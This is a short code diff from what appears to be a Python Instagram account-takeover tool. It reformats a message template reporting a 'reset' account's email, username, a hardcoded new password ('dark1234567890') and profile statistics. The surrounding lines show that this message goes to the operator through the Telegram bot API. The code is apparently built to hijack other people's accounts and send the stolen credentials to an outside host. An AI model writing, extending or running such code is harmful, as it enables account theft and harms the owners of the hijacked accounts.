@@ -622,7 +622,18 @@ def getu(eml, hash_val, ex):
                             private_status = " Private" if is_private else " Public"
                             verified_status = "✓ Verified" if is_verified else "✗ Not Verified"
                             
-                            ff = f''' ✅ Instagram Account Reset Complete! Email : {eml} Username : {username} New Password : dark1234567890 Account Statistics: Full Name: {full_name} Followers: {followers_count:,} Following: {following_count:,} Posts: {posts_count} Account Year: {account_year} Status: {private_status} | {verified_status} ════════════════════════════════ Profile: instagram.com/{username} By eng :@eo_xr '''
+                            ff = f''' ✅ Instagram Account Reset Complete!
+                            Email : {eml} Username : {username}
+                            New Password : dark1234567890
+                            Account Statistics: Full Name: {full_name} 
+                            Followers: {followers_count:,}
+                            Following: {following_count:,} 
+                            Posts: {posts_count} Account 
+                            Year: {account_year} 
+                            Status: {private_status} |
+                            {verified_status} ════════════════════════════════
+                            Profile: instagram.com/{username} 
+                            By eng :@eo_xr '''
                             
                             message = ff
                             url = f"https://api.telegram.org/bot{token}/sendMessage"
